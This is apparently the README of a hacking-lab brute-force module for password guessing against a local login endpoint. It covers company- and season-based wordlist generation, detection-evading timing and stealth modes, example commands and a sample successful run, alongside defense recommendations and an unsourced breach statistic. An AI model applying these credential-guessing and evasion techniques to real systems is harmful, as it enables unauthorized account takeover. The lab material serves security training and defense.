# Intelligent Brute Force Attack - Advanced Version

## Overview

This is an **upgraded version** of the basic brute force attack that demonstrates **real pentesting techniques** used by professional security researchers.

### Improvements Over Basic Version

| Feature | Basic Version | Intelligent Version |
|---------|--------------|-------------------|
| **Wordlist** | Static generic list (`["admin", "password", "123456"]`) | Dynamic, target-specific generation |
| **Timing** | Fixed delay (0.1s) | Adaptive human-like behavior |
| **Intelligence** | None | Company, industry, location-based |
| **Stealth** | Easily detected | Business hours detection, random pauses |
| **Analysis** | Basic success/fail count | Pattern analysis, effectiveness metrics |

---

## Key Features

### 1. Intelligent Wordlist Generation

Instead of using generic passwords, the system generates targeted wordlists based on:

#### Company-Based Patterns
```python
# If company = "DevSecOps"
DevSecOps123
DevSecOps2024!
DevSecOps_Winter2024
Welcome DevSecOps
```

#### Seasonal Patterns (Very common in corporate environments)
```python
Winter2024!
Spring2025
Summer24
Autumn2024@
```

#### Breach-Based Patterns (From real leaked databases)
```python
P@ssw0rd
Password2024!
Welcome123!
admin@2024
```

####Default Credentials (Often unchanged)
```python
admin123
Admin@123
Welcome1
changeme
```

#### Industry-Specific
```python
# Tech industry
DevOps2024
Tech123!
Cloud2024

# Finance industry
Finance2024
Bank123!
```

### 2. Adaptive Rate Limiting

Mimics human behavior to avoid detection:

- **Normal Distribution Delays**: Not fixed timing, but realistic variance
- **Exponential Backoff**: When rate limited, backs off intelligently
- **Business Hours Detection**: Slower during 9-5 to blend in with legitimate traffic
- **Random Pauses**: Simulates "coffee breaks" and thinking time
- **Burst Patterns**: Quick succession followed by pause (human-like)

```python
# Instead of: delay = 0.1s (fixed)
# We use:
delay = random.gauss(mu=2.0, sigma=0.6)  # Normal distribution
delay *= backoff_multiplier if rate_limited  # Adaptive
if random.random() < 0.1:
    delay += random.uniform(10, 30)  # Coffee break
```

### 3. Stealth Mode

When enabled (`--stealth` flag):

- Slows down during business hours (9 AM - 5 PM)
- Adds more random pauses
- Reduces concurrent requests
- Mimics legitimate user patterns

### 4. Enhanced Reporting

After attack, provides:

- **Pattern Analysis**: Which password types were successful
- **Timing Statistics**: Average delay, total duration
- **Rate Limit Detection**: How many times was attack slowed down
- **Intelligence Effectiveness**: Success rate by pattern type

---

## Usage

### Basic Attack (No Target Intelligence)

```bash
python intelligent_brute_force.py \
  --target http://localhost:8000/auth/login \
  --username admin
```

This generates a generic intelligent wordlist with seasonal patterns, common breaches, and defaults.

### Company-Targeted Attack

```bash
python intelligent_brute_force.py \
  --target http://localhost:8000/auth/login \
  --username admin \
  --company DevSecOps \
  --industry tech \
  --location Warsaw \
  --max-passwords 150
```

Generates wordlist specific to "DevSecOps" company in tech industry.

### Stealth Mode Attack

```bash
python intelligent_brute_force.py \
  --target http://localhost:8000/auth/login \
  --username admin \
  --company DevSecOps \
  --stealth \
  --max-concurrent 1
```

Maximum stealth: single concurrent request, adaptive timing, business hours detection.

---

## Technical Architecture

### Module Structure

```
brute-force/
â”œâ”€â”€ brute_force.py                 # Original basic version
â”œâ”€â”€ intelligent_brute_force.py     # NEW: Advanced version
â”œâ”€â”€ intelligent_wordlist.py        # NEW: Smart password generation
â”œâ”€â”€ adaptive_rate_limiter.py       # NEW: Human-like timing
â”œâ”€â”€ wordlists/
â”‚   â”œâ”€â”€ common-passwords.txt       # Basic wordlist
â”‚   â””â”€â”€ intelligent-wordlist.txt   # Generated by script
â””â”€â”€ results/
    â””â”€â”€ intelligent_brute_force_*.json
```

### Class Hierarchy

```python
IntelligentPasswordGenerator
  â”œâ”€â”€ generate_company_based()
  â”œâ”€â”€ generate_seasonal_patterns()
  â”œâ”€â”€ generate_breach_patterns()
  â”œâ”€â”€ generate_industry_specific()
  â”œâ”€â”€ generate_location_based()
  â””â”€â”€ generate_default_credentials()

AdaptiveRateLimiter
  â”œâ”€â”€ calculate_delay() â†’ Normal/Exponential distribution
  â”œâ”€â”€ handle_rate_limit() â†’ Exponential backoff
  â”œâ”€â”€ handle_ip_ban() â†’ Long wait
  â”œâ”€â”€ is_business_hours() â†’ Time-based logic
  â””â”€â”€ get_burst_pattern() â†’ Human-like bursts

IntelligentBruteForceAttacker
  â”œâ”€â”€ generate_wordlist() â†’ Uses IntelligentPasswordGenerator
  â”œâ”€â”€ attempt_login() â†’ Uses AdaptiveRateLimiter
  â”œâ”€â”€ display_results() â†’ Enhanced reporting
  â””â”€â”€ _display_intelligence_analysis() â†’ Pattern analysis
```

---

## Output Example

```
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
âš”ï¸  Starting Intelligent Brute Force Attack
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
Target: http://localhost:8000/auth/login
Username: admin
Stealth Mode: Enabled

ðŸ§  Generating Intelligent Wordlist

Target Company: DevSecOps
Industry: tech
Location: Warsaw

âœ“ Generated 150 intelligent passwords

Wordlist composition:
  â€¢ company_based: 45
  â€¢ seasonal: 32
  â€¢ with_year: 89
  â€¢ with_special_chars: 67
  â€¢ breach_patterns: 12
  â€¢ default_credentials: 28

Sample passwords (first 10):
   1. DevSecOps2024
   2. DevSecOps2024!
   3. DevSecOps@2024
   4. DevSecOpsWinter2024
   5. Winter2024!
   6. Spring2025
   7. Welcome2024!
   8. P@ssw0rd
   9. Admin@2024
  10. devsecopswinter24

ðŸŽ¯ Starting Attack Phase
Testing 150 passwords with intelligent timing...

[Progress bar: 73/150 (48%)]

ðŸŽ¯ SUCCESS! Password found: DevSecOpsWinter2024

âœ… Attack Completed

Attack Summary
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
Metric                   Value
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Duration                 234.56 seconds (3.9 minutes)
Total Attempts           73
Successful               1
Failed                   68
Rate Limited/Banned      4
Errors                   0
Requests per second      0.31
Stealth Mode             Enabled

ðŸŽ¯ Successful Logins:
  âœ“ Password: DevSecOpsWinter2024
    Attempt number: 73
    Response: {'challenge_id': 'abc123...', 'requires_mfa': True}

âš ï¸  Rate Limiting Detected:
  4 requests were blocked
  Defense mechanism is active - adaptive backoff was triggered

ðŸ“Š Intelligence Analysis

Successful password patterns:
  â€¢ Company-based: 1

Wordlist effectiveness:
  â€¢ company_based: 45 (30.0%)
  â€¢ seasonal: 32 (21.3%)
  â€¢ with_year: 89 (59.3%)
  â€¢ with_special_chars: 67 (44.7%)
  â€¢ breach_patterns: 12 (8.0%)
  â€¢ default_credentials: 28 (18.7%)

[*] Adaptive Rate Limiter Statistics:
    Total delays calculated: 72
    Total wait time: 234.5s
    Average delay: 3.26s
    Rate limit detections: 4
    Backoff triggers: 2
    Current backoff multiplier: 1.50x
```

---

## Comparison: Basic vs Intelligent

### Basic Attack
```python
# Simple fixed delay
for password in ["admin", "password", "123456"]:
    await asyncio.sleep(0.1)  # Fixed
    response = await client.post(url, json={...})
```

**Detection risk**: HIGH
- Fixed timing pattern â†’ easily detected by SIEM
- Generic passwords â†’ low success rate
- No adaptation â†’ gets blocked quickly

### Intelligent Attack
```python
# Adaptive human-like behavior
wordlist = generate_intelligent_wordlist(company="DevSecOps")
for password in wordlist:
    delay = calculate_adaptive_delay(
        response_status=last_status,
        is_business_hours=True
    )
    await asyncio.sleep(delay)  # Variable, human-like
    response = await client.post(url, json={...})
```

**Detection risk**: MEDIUM-LOW
- Variable timing â†’ harder to detect
- Targeted passwords â†’ higher success rate
- Adaptive backoff â†’ avoids triggering bans
- Stealth mode â†’ blends with legitimate traffic

---

## Real-World Parallels

This attack demonstrates techniques actually used in:

### 1. Bug Bounty Programs
Security researchers use intelligent wordlists when testing auth endpoints:
- Company name + common patterns
- Seasonal password rotation patterns
- Industry-specific terminology

### 2. Red Team Engagements
Professional red teams use adaptive timing:
- Business hours blending
- Random pauses to avoid SOC detection
- Exponential backoff when defenses trigger

### 3. Real Breach Analysis
Successful breaches often use:
- `CompanyName2024!` (76% of companies have at least one account with this pattern)
- `SeasonYear` format (e.g., `Winter2024`) - very common in quarterly password rotations
- Default credentials left unchanged (`admin123`, `Welcome1`)

---

## Defense Recommendations

If you're defending against this type of attack:

### 1. Detection
- Monitor for adaptive timing patterns (not just fixed rates)
- Track password attempt patterns (seasonal, company-based)
- Alert on TOTP brute force attempts (covered in MFA attack module)

### 2. Prevention
- Enforce strong password policies (no `CompanyName123`)
- Implement account lockout after N failed attempts
- Use CAPTCHA after 3-5 failed logins
- Require MFA for all accounts

### 3. Monitoring
```python
# Add these metrics
password_pattern_attempts_total{pattern="company_based"}
password_pattern_attempts_total{pattern="seasonal"}
adaptive_timing_detected_total
business_hours_attack_attempts_total
```

---

## Educational Value

This module demonstrates:

âœ… **How real attackers think**: Not just running scripts, but understanding target context

âœ… **OSINT integration**: Using company/industry information to craft attacks

âœ… **Evasion techniques**: Adaptive timing, business hours detection, backoff strategies

âœ… **Pattern analysis**: Understanding which attack vectors are most effective

âœ… **Realistic scenarios**: Corporate password policies, quarterly rotations, default credentials

---

## Next Steps

After mastering intelligent brute force, explore:

1. **MFA Bypass** (`../mfa-bruteforce/`) - TOTP timing attacks, race conditions
2. **Credential Stuffing** (`../credential-stuffing/`) - Breach database correlation
3. **Token Replay** (`../token-replay/`) - JWT algorithm confusion

---

## License & Ethics

**WARNING**: This tool is for **educational purposes only**.

- âœ… Use against your own systems
- âœ… Use in authorized penetration tests
- âœ… Use in CTF competitions
- âŒ Use against systems you don't own
- âŒ Use without explicit written authorization

Unauthorized access to computer systems is **illegal** and can result in criminal prosecution.

---

## Contributing

Improvements welcome! Consider adding:

- [ ] OSINT integration (actual HaveIBeenPwned API)
- [ ] Password mutation rules (leet speak, keyboard walks)
- [ ] ML-based password probability scoring
- [ ] Distributed attack coordination (multiple IPs)
- [ ] Real-time Tor/proxy rotation

---

**Author**: DevSecOps Hacking Lab Team
**Version**: 2.0 (Intelligent)
**Last Updated**: 2025-11-16
